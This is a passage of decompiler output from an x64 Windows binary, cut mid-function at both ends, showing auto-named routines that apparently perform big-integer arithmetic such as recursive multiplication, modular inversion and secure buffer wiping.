  bool v15; // zf
  __int64 result; // rax
  unsigned __int64 v17; // rbp
  __int64 v18; // rbx
  __int64 v19; // [rsp+50h] [rbp+8h]
  __int64 v20; // [rsp+60h] [rbp+18h]

  v20 = (__int64)a3;
  v19 = a1;
  v4 = a2;
  v5 = a1;
  if ( a4 == 2 )
  {
    v6 = 3;
    v7 = *a3 & 7i64;
    do
    {
      v6 *= 2;
      v7 *= 2 - *a3 * v7;
    }
    while ( v6 < 0x40 );
    a2->m128i_i64[0] = v7;
    a2->m128i_i64[1] = 0i64;
    qword_1400DA8D0(&a2[1], a2);
    v8 = v4[1].m128i_u64[0];
    v9 = 1;
    v4[1].m128i_i64[0] = v8 - 1;
    if ( v8 - 1 > v8 )
    {
      v10 = 1;
      v11 = &v4[1].m128i_i64[1];
      do
      {
        v12 = (*v11)--;
        if ( v12 )
          break;
        ++v10;
        ++v11;
      }
      while ( v10 < 2 );
    }
    _mm_storeu_si128(v4 + 1, _mm_andnot_si128(_mm_loadu_si128(v4 + 1), (__m128i)xmmword_1400AA040));
    v13 = v4[1].m128i_u64[0];
    v4[1].m128i_i64[0] = v13 + 2;
    if ( v13 + 2 < v13 )
    {
      v14 = &v4[1].m128i_i64[1];
      do
      {
        v15 = (*v14)++ == -1;
        if ( !v15 )
          break;
        ++v9;
        ++v14;
      }
      while ( v9 < 2 );
    }
    result = qword_1400DA8D0(v19, v4);
  }
  else
  {
    v17 = a4 >> 1;
    sub_14004AC00(a1, a2, a3, a4 >> 1);
    v4->m128i_i64[0] = 1i64;
    if ( v17 != 1 )
      memset(&v4->m128i_i64[1], 0, 8 * (v17 - 1));
    v18 = v5 + 8 * v17;
    sub_1400499D0(v18, (__int64)&v4->m128i_i64[v17], (__int64)v4, v19, v20, v17);
    sub_14004B130((__int64)v4, (__int64)&v4->m128i_i64[v17], v19, v20 + 8 * v17, v17);
    sub_140062F10(v17, (__int64)v4, v18, (__int64)v4);
    sub_14004C0B0((unsigned __int64 *)v4, v17);
    result = sub_14004B130(v18, (__int64)&v4->m128i_i64[v17], v19, (__int64)v4, v17);
  }
  return result;
}
// 1400DA8D0: invalid function type has been ignored
// 1400AA040: using guessed type __int128 xmmword_1400AA040;
// 1400DA8D0: using guessed type __int64 (__fastcall *qword_1400DA8D0)(_QWORD, _QWORD);

//----- (000000014004ADC0) ----------------------------------------------------
unsigned __int64 __fastcall sub_14004ADC0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int64 a5)
{
  __int64 v5; // r10
  __int64 v6; // r11
  unsigned __int64 result; // rax
  unsigned __int64 v8; // rbp
  unsigned int v9; // ebx
  unsigned __int64 v10; // rcx
  signed __int64 v11; // rax
  unsigned __int64 v12; // rdx
  unsigned __int64 v13; // r8
  signed int v14; // eax
  unsigned __int64 v15; // rcx
  unsigned __int64 v16; // rcx
  signed __int64 v17; // rax
  unsigned __int64 v18; // rdx
  unsigned __int64 v19; // r8
  signed int v20; // eax
  unsigned __int64 v21; // rsi
  BOOL v22; // ST30_4
  __int64 v23; // rdi
  signed __int64 v24; // rax
  int v25; // er9
  unsigned __int64 v26; // rdx
  unsigned __int64 v27; // rcx
  signed int v28; // eax
  unsigned int v29; // ecx
  signed __int64 v30; // rax
  bool v31; // zf
  unsigned __int64 v32; // rdx
  int v33; // [rsp+30h] [rbp-48h]
  int v34; // [rsp+38h] [rbp-40h]
  unsigned __int64 *v35; // [rsp+40h] [rbp-38h]
  unsigned __int64 v36; // [rsp+48h] [rbp-30h]
  __int64 v37; // [rsp+80h] [rbp+8h]
  __int64 v38; // [rsp+88h] [rbp+10h]
  __int64 v39; // [rsp+98h] [rbp+20h]
  unsigned __int64 *v40; // [rsp+A0h] [rbp+28h]

  v39 = a4;
  v38 = a2;
  v37 = a1;
  v5 = a3;
  v6 = a1;
  if ( a5 <= 0x10 )
    return ((__int64 (__fastcall *)(__int64, __int64, __int64))qword_1400DA880[a5 >> 2])(a1, a3, a4);
  v8 = a5 >> 1;
  v9 = 1;
  v10 = a5 >> 1;
  if ( a5 >> 1 )
  {
    v11 = 8 * v8 + a3;
    while ( 1 )
    {
      v12 = *(_QWORD *)(v11 - 8);
      v13 = *(_QWORD *)(8 * v8 + v11 - 8);
      v11 -= 8i64;
      --v10;
      if ( v12 > v13 )
        break;
      if ( v12 < v13 )
      {
        v14 = -1;
        goto LABEL_9;
      }
      if ( !v10 )
        goto LABEL_8;
    }
    v14 = 1;
  }
  else
  {
LABEL_8:
    v14 = 0;
  }
LABEL_9:
  v15 = a5 >> 1;
  if ( v14 > 0 )
    v15 = 0i64;
  v36 = v15;
  sub_140062F60(v8, v6, v5 + 8 * v15, v5 + 8 * (v8 ^ v15));
  v16 = a5 >> 1;
  if ( v8 )
  {
    v17 = 8 * v8 + v39;
    while ( 1 )
    {
      v18 = *(_QWORD *)(v17 - 8);
      v19 = *(_QWORD *)(8 * v8 + v17 - 8);
      v17 -= 8i64;
      --v16;
      if ( v18 > v19 )
        break;
      if ( v18 < v19 )
      {
        v20 = -1;
        goto LABEL_17;
      }
      if ( !v16 )
        goto LABEL_16;
    }
    v20 = 1;
  }
  else
  {
LABEL_16:
    v20 = 0;
  }
LABEL_17:
  v21 = a5 >> 1;
  if ( v20 > 0 )
    v21 = 0i64;
  sub_140062F60(v8, 8 * v8 + v37, v39 + 8 * v21, v39 + 8 * (v8 ^ v21));
  v35 = (unsigned __int64 *)(v37 + 8 * a5);
  sub_14004ADC0(v37 + 8 * a5);
  sub_14004ADC0(v38);
  sub_14004ADC0(v37);
  v22 = sub_140062F10(v8, (__int64)v35, (__int64)v35, v37 + 8 * v8);
  v23 = a5;
  v34 = (unsigned __int64)sub_140062F10(v8, v37 + 8 * v8, (__int64)v35, v37) + v22;
  v40 = (unsigned __int64 *)(v37 + 8 * (a5 + v8));
  v33 = (unsigned __int64)sub_140062F10(v8, (__int64)v35, (__int64)v35, (__int64)v40) + v22;
  v24 = 8 * v8;
  if ( v36 == v21 )
    v25 = v33 - (unsigned __int64)sub_140062F60(v23, v37 + v24, v37 + v24, v38);
  else
    v25 = (unsigned __int64)sub_140062F10(v23, v37 + v24, v37 + v24, v38) + v33;
  v26 = *v35;
  v27 = *v35 + v34;
  *v35 = v27;
  if ( v27 < v26 )
  {
    v29 = 1;
    if ( v8 <= 1 )
    {
LABEL_32:
      v28 = 1;
      goto LABEL_33;
    }
    v30 = 1i64;
    while ( 1 )
    {
      v31 = v35[v30]++ == -1i64;
      if ( !v31 )
        break;
      v30 = ++v29;
      if ( v29 >= v8 )
        goto LABEL_32;
    }
  }
  v28 = 0;
LABEL_33:
  v32 = *v40;
  result = *v40 + v25 + v28;
  *v40 = result;
  if ( result < v32 && v8 > 1 )
  {
    result = 1i64;
    do
    {
      v31 = v40[result]++ == -1i64;
      if ( !v31 )
        break;
      result = ++v9;
    }
    while ( v9 < v8 );
  }
  return result;
}
// 1400DA880: using guessed type __int64 qword_1400DA880[];

//----- (000000014004B130) ----------------------------------------------------
__int64 __fastcall sub_14004B130(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int64 a5)
{
  __int64 v5; // rbp
  __int64 v6; // rbx
  __int64 v7; // rdi
  unsigned __int64 v9; // rsi
  __int64 v10; // rdi
  __int64 v11; // [rsp+50h] [rbp+8h]
  __int64 v12; // [rsp+58h] [rbp+10h]
  __int64 v13; // [rsp+60h] [rbp+18h]

  v13 = a3;
  v12 = a2;
  v11 = a1;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  if ( a5 <= 0x10 )
    return ((__int64 (__fastcall *)(__int64, __int64, __int64))*(&qword_1400DA8D0 + (a5 >> 2)))(a1, a3, a4);
  v9 = a5 >> 1;
  sub_14004ADC0(a1, a2, a3, a4, a5 >> 1);
  v10 = v7 + 8 * (a5 >> 1);
  sub_14004B130(v12, v10, v6 + 8 * v9, v5, v9);
  sub_140062F10(v9, v11 + 8 * v9, v11 + 8 * v9, v12);
  sub_14004B130(v12, v10, v13, v5 + 8 * v9, v9);
  return sub_140062F10(a5 >> 1, v11 + 8 * (a5 >> 1), v11 + 8 * (a5 >> 1), v12);
}
// 1400DA8D0: using guessed type __int64 (__fastcall *qword_1400DA8D0)(_QWORD, _QWORD);

//----- (000000014004B210) ----------------------------------------------------
__int64 __fastcall sub_14004B210(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  __int64 v4; // rbp
  __int64 v5; // rbx
  __int64 result; // rax
  __int64 v7; // rdi
  unsigned __int64 v8; // rsi
  __int64 v9; // rbx
  unsigned __int64 v10; // rdx
  unsigned __int64 *v11; // r8
  unsigned __int64 v12; // rcx
  signed __int64 v13; // rcx
  bool v14; // zf
  __int64 v15; // [rsp+50h] [rbp+8h]
  __int64 v16; // [rsp+58h] [rbp+10h]
  __int64 v17; // [rsp+60h] [rbp+18h]

  v17 = a3;
  v16 = a2;
  v15 = a1;
  v4 = a4;
  v5 = a3;
  if ( a4 <= 0x10 )
    return ((__int64 (__fastcall *)(__int64, __int64))qword_1400DA920[a4 >> 2])(a1, a3);
  v7 = a2 + 8 * a4;
  v8 = a4 >> 1;
  sub_14004B210(a1, v7, a3, a4 >> 1);
  v9 = v5 + 8 * v8;
  sub_14004B210(v15 + 8 * v4, v7, v9, v8);
  sub_14004ADC0(v16, v7, v17, v9, v8);
  LODWORD(v7) = sub_140062F10(v4, v15 + 8 * v8, v15 + 8 * v8, v16);
  LODWORD(v7) = sub_140062F10(v4, v15 + 8 * v8, v15 + 8 * v8, v16) + v7;
  result = v15;
  v10 = *(_QWORD *)(v15 + 8 * (v8 + v4));
  v11 = (unsigned __int64 *)(v15 + 8 * (v8 + v4));
  v12 = v10 + (signed int)v7;
  *v11 = v12;
  if ( v12 < v10 )
  {
    result = 1i64;
    if ( v8 > 1 )
    {
      v13 = 1i64;
      do
      {
        v14 = v11[v13]++ == -1i64;
        if ( !v14 )
          break;
        result = (unsigned int)(result + 1);
        v13 = (unsigned int)result;
      }
      while ( (unsigned int)result < v8 );
    }
  }
  return result;
}
// 1400DA920: using guessed type __int64 qword_1400DA920[];

//----- (000000014004B320) ----------------------------------------------------
__int64 __fastcall sub_14004B320(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_14003D5D0(a2, a3);
}

//----- (000000014004B330) ----------------------------------------------------
__int64 __fastcall sub_14004B330(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rcx
  __int64 v5; // rbx
  __int64 v6; // rax

  v3 = a1;
  v4 = *(_QWORD *)(a2 + 16);
  v5 = a2;
  v6 = *(_QWORD *)(v3 + 40);
  if ( v4 != v6 || *(_QWORD *)(a3 + 16) != v6 )
  {
    sub_14003D5D0(a2, a3);
    if ( *(_DWORD *)(v5 + 32) == 1 )
      sub_14003D540(v5, v3 + 24);
  }
  else if ( (unsigned int)sub_140062F60(v4, *(_QWORD *)(a2 + 24), *(_QWORD *)(a2 + 24), *(_QWORD *)(a3 + 24)) )
  {
    sub_140062F10(*(_QWORD *)(v5 + 16), *(_QWORD *)(v5 + 24), *(_QWORD *)(v5 + 24), *(_QWORD *)(v3 + 48));
    return v5;
  }
  return v5;
}

//----- (000000014004B580) ----------------------------------------------------
signed __int64 __fastcall sub_14004B580(unsigned __int64 a1)
{
  unsigned int v2; // edx
  unsigned int v3; // er8

  if ( a1 <= 8 )
    return (unsigned int)dword_1400A8B28[a1];
  if ( a1 <= 0x10 )
    return 16i64;
  if ( a1 <= 0x20 )
    return 32i64;
  if ( a1 <= 0x40 )
    return 64i64;
  LOBYTE(v2) = 0;
  if ( a1 != 1 )
  {
    v3 = 0;
    v2 = 64;
    do
    {
      if ( (a1 - 1) >> ((v2 + v3) >> 1) )
        v3 = (v2 + v3) >> 1;
      else
        v2 = (v2 + v3) >> 1;
    }
    while ( v2 - v3 > 1 );
  }
  return 1i64 << v2;
}

//----- (000000014004B6F0) ----------------------------------------------------
__int64 *__fastcall sub_14004B6F0(char *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  __int64 *result; // rax
  unsigned __int64 v4; // r8
  unsigned __int64 v5; // rdi
  __int64 v6; // rdx
  unsigned __int64 v7; // [rsp+18h] [rbp+10h]
  unsigned __int64 v8; // [rsp+20h] [rbp+18h]

  v8 = a3;
  v7 = a2;
  result = (__int64 *)&v7;
  if ( a2 >= a3 )
    result = (__int64 *)&v8;
  v4 = *result;
  if ( *result )
  {
    if ( a2 - 1 >= v4 )
    {
      result = (__int64 *)&a1[8 * (a2 - 1)];
      v5 = a2 - v4;
      do
      {
        v6 = result[-v4];
        --result;
        result[1] = v6;
        --v5;
      }
      while ( v5 );
    }
    if ( v4 )
    {
      result = 0i64;
      memset(a1, 0, 8 * v4);
    }
  }
  return result;
}

//----- (000000014004B770) ----------------------------------------------------
__int64 *__fastcall sub_14004B770(__int64 *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  __int64 *v3; // r9
  __int64 *result; // rax
  unsigned __int64 v5; // rdi
  unsigned __int64 v6; // r8
  unsigned __int64 v7; // rdx
  __int64 v8; // rcx
  __int64 *v9; // rdi
  unsigned __int64 v10; // [rsp+10h] [rbp+10h]
  unsigned __int64 v11; // [rsp+18h] [rbp+18h]

  v3 = a1;
  result = (__int64 *)&v10;
  v11 = a3;
  v10 = a2;
  if ( a2 >= a3 )
    result = (__int64 *)&v11;
  v5 = a2;
  v6 = *result;
  if ( *result )
  {
    if ( v6 < a2 )
    {
      v7 = *result;
      result = a1;
      do
      {
        v8 = result[v6];
        ++v7;
        ++result;
        *(result - 1) = v8;
      }
      while ( v7 < v5 );
    }
    v9 = &v3[v5 - v6];
    if ( v6 )
    {
      result = 0i64;
      memset(v9, 0, 8 * v6);
    }
  }
  return result;
}

//----- (000000014004B7E0) ----------------------------------------------------
void __fastcall sub_14004B7E0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5)
{
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbx
  __int64 v8; // rax
  __int64 v9; // rsi
  void *v10; // rdx
  __int64 v11; // rax
  void *v12; // rdx
  void *v13; // rdx
  void *v14; // rdx
  void *v15; // rdx
  void *v16; // rdx
  void *v17; // rdx
  char v18; // [rsp+30h] [rbp-108h]
  __int64 v19; // [rsp+40h] [rbp-F8h]
  void *Memory; // [rsp+48h] [rbp-F0h]
  __int64 v21; // [rsp+58h] [rbp-E0h]
  char v22; // [rsp+60h] [rbp-D8h]
  __int64 v23; // [rsp+88h] [rbp-B0h]
  void *v24; // [rsp+90h] [rbp-A8h]
  __int64 v25; // [rsp+B0h] [rbp-88h]
  void *v26; // [rsp+B8h] [rbp-80h]
  __int64 v27; // [rsp+D8h] [rbp-60h]
  void *v28; // [rsp+E0h] [rbp-58h]
  __int64 v29; // [rsp+100h] [rbp-38h]
  void *v30; // [rsp+108h] [rbp-30h]
  __int64 v31; // [rsp+120h] [rbp-18h]
  void *v32; // [rsp+128h] [rbp-10h]

  v21 = -2i64;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  if ( *(_QWORD *)(a1 + 40) && **(_BYTE **)(a1 + 48) & 1 )
  {
    sub_14003BA90(&v22, a1 + 24);
    v8 = sub_140025990((__int64)&v22, (__int64)&v18, v6);
    v9 = a5;
    sub_1400525A0((__int64)&v22, v7, v8, v5);
    v10 = Memory;
    memset(Memory, 0, 8 * v19);
    free(v10);
    if ( a5 )
    {
      do
      {
        v11 = sub_140045AA0(&v22, (__int64)&v18, v7);
        sub_14003C670(v7, v11);
        v12 = Memory;
        memset(Memory, 0, 8 * v19);
        free(v12);
        v7 += 40i64;
        --v9;
      }
      while ( v9 );
    }
    v13 = v32;
    memset(v32, 0, 8 * v31);
    free(v13);
    v14 = v30;
    memset(v30, 0, 8 * v29);
    free(v14);
    v15 = v28;
    memset(v28, 0, 8 * v27);
    free(v15);
    v16 = v26;
    memset(v26, 0, 8 * v25);
    free(v16);
    v17 = v24;
    memset(v24, 0, 8 * v23);
    free(v17);
  }
  else
  {
    sub_1400525A0(a1, a2, a3, a4);
  }
}

//----- (000000014004B990) ----------------------------------------------------
__int64 __fastcall sub_14004B990(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rbx
  void *v5; // rdx
  char v7; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v2 = a1;
  v3 = sub_140029020(a2, (__int64)&v7);
  v4 = sub_14003C670(v2 + 64, v3);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v4;
}

//----- (000000014004B9F0) ----------------------------------------------------
signed __int64 __fastcall sub_14004B9F0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbp
  __int64 v3; // rsi
  void *v4; // r15
  __int64 v5; // rdi
  _QWORD *v6; // rbx
  __int64 v7; // r14
  __int64 v8; // rdi

  v2 = a1[5];
  v3 = a1[25];
  v4 = (void *)a1[11];
  v5 = a2;
  v6 = a1;
  v7 = v3 + 16i64 * a1[5];
  sub_14004B210(v3, v7, *(_QWORD *)(a2 + 24), *(_QWORD *)(a2 + 16));
  v8 = *(_QWORD *)(v5 + 16);
  if ( 2 * (v2 - v8) )
    memset((void *)(v3 + 16 * v8), 0, 16 * (v2 - v8));
  sub_1400493F0(v4, v7, v3, v6[6], v6[21], v2);
  return (signed __int64)(v6 + 8);
}

//----- (000000014004BAA0) ----------------------------------------------------
__int64 __fastcall sub_14004BAA0(signed __int64 a1, __int64 a2)
{
  __int64 v2; // r15
  __int64 v3; // r14
  _QWORD *v4; // rdx
  __int64 v5; // rax
  signed __int64 v6; // rsi
  _QWORD *v7; // rax
  _QWORD *v8; // rbx
  int v9; // eax
  _QWORD *v10; // r10
  unsigned __int64 v11; // rax
  _QWORD *v12; // rcx
  signed __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  __int64 v16; // rdi
  unsigned __int64 v17; // rdx
  __int64 v18; // r8
  __int64 v19; // rax
  _QWORD *v20; // rax
  signed __int64 v21; // rax
  void *v22; // rdx
  void *v23; // rdx
  void *v24; // rdx
  __int64 v25; // rcx
  _QWORD *v26; // rdx
  __int64 v27; // rdi
  _QWORD *v28; // rdx
  __int64 v29; // rdx
  unsigned __int64 *v30; // rcx
  unsigned __int64 v31; // rdi
  int v32; // edx
  __int64 v33; // rcx
  _QWORD *v34; // rdx
  __int64 v35; // rdi
  _QWORD *v36; // rdx
  __int64 v37; // rdx
  unsigned __int64 *v38; // rcx
  unsigned __int64 v39; // rdi
  signed int v40; // edx
  void *v41; // rdx
  __int64 v42; // rax
  char v44; // [rsp+20h] [rbp-E0h]
  char v45; // [rsp+28h] [rbp-D8h]
  char v46; // [rsp+30h] [rbp-D0h]
  unsigned __int64 v47; // [rsp+38h] [rbp-C8h]
  void *Src; // [rsp+40h] [rbp-C0h]
  int v49; // [rsp+48h] [rbp-B8h]
  int v50; // [rsp+50h] [rbp-B0h]
  __int64 (__fastcall **v51)(void *); // [rsp+58h] [rbp-A8h]
  char v52; // [rsp+60h] [rbp-A0h]
  __int64 v53; // [rsp+68h] [rbp-98h]
  void *v54; // [rsp+70h] [rbp-90h]
  int v55; // [rsp+78h] [rbp-88h]
  __int64 v56; // [rsp+80h] [rbp-80h]
  __int64 v57; // [rsp+88h] [rbp-78h]
  char v58; // [rsp+90h] [rbp-70h]
  __int64 v59; // [rsp+A0h] [rbp-60h]
  void *Memory; // [rsp+A8h] [rbp-58h]
  char v61; // [rsp+B8h] [rbp-48h]
  __int64 v62; // [rsp+C8h] [rbp-38h]
  void *v63; // [rsp+D0h] [rbp-30h]
  char v64; // [rsp+E0h] [rbp-20h]
  __int64 v65; // [rsp+F0h] [rbp-10h]
  void *v66; // [rsp+F8h] [rbp-8h]

  v57 = -2i64;
  v2 = a2;
  v3 = a1;
  v56 = a2;
  v50 = 0;
  if ( *(_DWORD *)(a1 + 32) == 1 )
    goto LABEL_82;
  v4 = *(_QWORD **)(a1 + 24);
  if ( !*v4 )
  {
    v5 = *(_QWORD *)(a1 + 16);
    if ( v5 )
    {
      a1 = (signed __int64)&v4[v5 - 1];
      do
      {
        if ( *(_QWORD *)a1 )
          break;
        a1 -= 8i64;
        --v5;
      }
      while ( v5 );
    }
    if ( !(_DWORD)v5 )
    {
LABEL_82:
      v42 = sub_14004B4E0(&v44);
      sub_14003C000(v2, v42);
      return v2;
    }
  }
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(a1);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  v51 = &off_1400A9910;
  v6 = 2i64;
  v53 = 2i64;
  v7 = sub_14003A000(0x10ui64);
  v8 = v7;
  v54 = v7;
  v55 = 0;
  v7[1] = 0i64;
  *v7 = 0i64;
  v9 = sub_140045340(v3);
  sub_14004A6C0(&v45, (unsigned __int64)(unsigned int)(v9 + 1) >> 1);
  v10 = Src;
  v11 = v47;
  do
  {
    while ( 1 )
    {
      if ( v6 != v11 || !v10[v11 >> 1] )
      {
        if ( v11 )
        {
          v12 = &v10[v11 - 1];
          do
          {
            if ( *v12 )
              break;
            --v12;
            --v11;
          }
          while ( v11 );
        }
        v13 = sub_14004B580((unsigned int)v11);
        sub_140049D90((__int64)&v52, v13);
        v8 = v54;
        v6 = v53;
        v10 = Src;
      }
      if ( v8 != v10 )
        memcpy_s(v8, 8 * v6, v10, 8 * v6);
      v55 = v49;
      sub_140024770((__int64)&v64, v3, (__int64)&v51);
      v14 = sub_140024740((__int64)&v61, (__int64)&v51);
      v15 = sub_14003CA00(v14, (__int64)&v58, 1ui64);
      v16 = v15;
      if ( &v45 != (char *)v15 )
      {
        v17 = *(_QWORD *)(v15 + 16);
        v18 = v47;
        if ( v47 != v17 || !*(_QWORD *)(*(_QWORD *)(v15 + 24) + 8 * (v17 >> 1)) )
        {
          v19 = *(_QWORD *)(v15 + 24);
          if ( v17 )
          {
            v20 = (_QWORD *)(v19 + 8 * v17 - 8);
            do
            {
              if ( *v20 )
                break;
              --v20;
              --v17;
            }
            while ( v17 );
          }
          v21 = sub_14004B580((unsigned int)v17);
          sub_140049D90((__int64)&v46, v21);
          v18 = v47;
        }
        if ( Src != *(void **)(v16 + 24) )
          memcpy_s(Src, 8 * v18, *(const void **)(v16 + 24), 8 * v18);
        v49 = *(_DWORD *)(v16 + 32);
      }
      v22 = Memory;
      memset(Memory, 0, 8 * v59);
      free(v22);
      v23 = v63;
      memset(v63, 0, 8 * v62);
      free(v23);
      v24 = v66;
      memset(v66, 0, 8 * v65);
      free(v24);
      v8 = v54;
      v6 = v53;
      if ( v49 != 1 )
        break;
      v10 = Src;
      v11 = v47;
      if ( v55 == 1 )
      {
        v33 = v47;
        if ( v47 )
        {
          v34 = (char *)Src + 8 * (v47 - 1);
          do
          {
            if ( *v34 )
              break;
            --v34;
            --v33;
          }
          while ( v33 );
        }
        v35 = v53;
        if ( v53 )
        {
          v36 = (char *)v54 + 8 * (v53 - 1);
          do
          {
            if ( *v36 )
              break;
            --v36;
            --v35;
          }
          while ( v35 );
        }
        if ( (_DWORD)v33 == (_DWORD)v35 )
        {
          v37 = (unsigned int)v33;
          if ( (_DWORD)v33 )
          {
            v38 = (unsigned __int64 *)((char *)v54 + 8 * (unsigned int)v33);
            while ( 1 )
            {
              --v37;
              --v38;
              v39 = *(unsigned __int64 *)((char *)v38 + (_BYTE *)Src - (_BYTE *)v54);
              if ( v39 > *v38 )
                break;
              if ( v39 < *v38 )
              {
                v40 = -1;
                goto LABEL_75;
              }
              if ( !v37 )
                goto LABEL_72;
            }
            v40 = 1;
          }
          else
          {
LABEL_72:
            v40 = 0;
          }
        }
        else
        {
          v40 = -1;
          if ( (unsigned int)v33 > (unsigned int)v35 )
            v40 = 1;
        }
LABEL_75:
        v32 = -v40;
        goto LABEL_76;
      }
    }
    if ( v55 == 1 )
      break;
    v11 = v47;
    v25 = v47;
    v10 = Src;
    if ( v47 )
    {
      v26 = (char *)Src + 8 * (v47 - 1);
      do
      {
        if ( *v26 )
          break;
        --v26;
        --v25;
      }
      while ( v25 );
    }
    v27 = v53;
    if ( v53 )
    {
      v28 = (char *)v54 + 8 * (v53 - 1);
      do
      {
        if ( *v28 )
          break;
        --v28;
        --v27;
      }
      while ( v27 );
    }
    if ( (_DWORD)v25 == (_DWORD)v27 )
    {
      v29 = (unsigned int)v25;
      if ( (_DWORD)v25 )
      {
        v30 = (unsigned __int64 *)((char *)v54 + 8 * (unsigned int)v25);
        while ( 1 )
        {
          --v29;
          --v30;
          v31 = *(unsigned __int64 *)((char *)v30 + (_BYTE *)Src - (_BYTE *)v54);
          if ( v31 > *v30 )
            break;
          if ( v31 < *v30 )
          {
            v32 = -1;
            goto LABEL_76;
          }
          if ( !v29 )
            goto LABEL_50;
        }
        v32 = 1;
      }
      else
      {
LABEL_50:
        v32 = 0;
      }
    }
    else
    {
      v32 = -1;
      if ( (unsigned int)v25 > (unsigned int)v27 )
        v32 = 1;
    }
LABEL_76:
    ;
  }
  while ( v32 < 0 );
  sub_14003C000(v2, (__int64)&v51);
  v50 = 1;
  v41 = Src;
  memset(Src, 0, 8 * v47);
  free(v41);
  memset(v8, 0, 8 * v6);
  free(v8);
  return v2;
}
// 14004A6C0: using guessed type __int64 __fastcall sub_14004A6C0(_QWORD, _QWORD);
// 14004B4E0: using guessed type __int64 __fastcall sub_14004B4E0(_QWORD);
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014004BF20) ----------------------------------------------------
__int64 __fastcall sub_14004BF20(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rax
  __int64 v5; // rbx
  void *v6; // rdx
  char v8; // [rsp+28h] [rbp-30h]
  __int64 v9; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v3 = a1;
  v4 = sub_140024710((__int64)&v8, a2, a3);
  v5 = sub_14003C670(v3 + 64, v4);
  v6 = Memory;
  memset(Memory, 0, 8 * v9);
  free(v6);
  return v5;
}

//----- (000000014004BF80) ----------------------------------------------------
signed __int64 __fastcall sub_14004BF80(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rbx
  __int64 v5; // rcx
  __int64 v6; // rax
  signed __int64 result; // rax
  __int64 v8; // rax
  void *v9; // rdx
  char v10; // [rsp+28h] [rbp-30h]
  __int64 v11; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v3 = a2;
  v4 = a1;
  v5 = *(_QWORD *)(a2 + 16);
  v6 = *(_QWORD *)(v4 + 40);
  if ( v5 != v6 || *(_QWORD *)(a3 + 16) != v6 )
  {
    v8 = sub_140024710((__int64)&v10, a2, a3);
    sub_14003C670(v4 + 104, v8);
    v9 = Memory;
    memset(Memory, 0, 8 * v11);
    free(v9);
    if ( *(_DWORD *)(v4 + 136) == 1 )
      sub_14003D540(v4 + 104, v4 + 24);
    result = v4 + 104;
  }
  else
  {
    if ( (unsigned int)sub_140062F60(v5, *(_QWORD *)(v4 + 88), *(_QWORD *)(a2 + 24), *(_QWORD *)(a3 + 24)) )
      sub_140062F10(*(_QWORD *)(v3 + 16), *(_QWORD *)(v4 + 88), *(_QWORD *)(v4 + 88), *(_QWORD *)(v4 + 48));
    result = v4 + 64;
  }
  return result;
}

//----- (000000014004C0A0) ----------------------------------------------------
__int64 sub_14004C0A0()
{
  char v1; // [rsp+8h] [rbp+8h]

  return sub_14004B450(&v1);
}
// 14004B450: using guessed type __int64 __fastcall sub_14004B450(_QWORD);

//----- (000000014004C0B0) ----------------------------------------------------
__int64 __fastcall sub_14004C0B0(unsigned __int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r8
  unsigned __int64 v3; // r10
  unsigned __int64 *v4; // r11
  unsigned __int64 v5; // rax
  unsigned int v6; // er8
  signed __int64 v7; // r9
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 result; // rax
  __m128i v11; // xmm1
  unsigned int v12; // er8
  __int64 v13; // rcx
  __int64 i; // rdx

  v2 = *a1;
  v3 = a2;
  v4 = a1;
  v5 = *a1 - 1;
  *a1 = v5;
  if ( v5 > v2 )
  {
    v6 = 1;
    if ( a2 > 1 )
    {
      v7 = 1i64;
      do
      {
        v8 = v4[v7];
        v4[v7] = v8 - 1;
        if ( v8 )
          break;
        v7 = ++v6;
      }
      while ( v6 < a2 );
    }
  }
  v9 = 0i64;
  result = 0i64;
  if ( v3 >= 4 )
  {
    v11 = _mm_load_si128((const __m128i *)&xmmword_1400AA040);
    v12 = 2;
    do
    {
      v13 = v12;
      result = (unsigned int)(result + 4);
      v12 += 4;
      _mm_storeu_si128((__m128i *)&v4[v9], _mm_andnot_si128(_mm_loadu_si128((const __m128i *)&v4[v9]), v11));
      v9 = (unsigned int)result;
      _mm_storeu_si128((__m128i *)&v4[v13], _mm_andnot_si128(_mm_loadu_si128((const __m128i *)&v4[v13]), v11));
    }
    while ( (unsigned int)result < v3 - (v3 & 3) );
  }
  for ( i = (unsigned int)result; (unsigned int)result < v3; i = (unsigned int)result )
  {
    v4[i] = ~v4[i];
    result = (unsigned int)(result + 1);
  }
  return result;
}
// 1400AA040: using guessed type __int128 xmmword_1400AA040;

//----- (000000014004C170) ----------------------------------------------------
__int64 __fastcall sub_14004C170(__int64 *a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 *v4; // rsi
  unsigned int v5; // eax

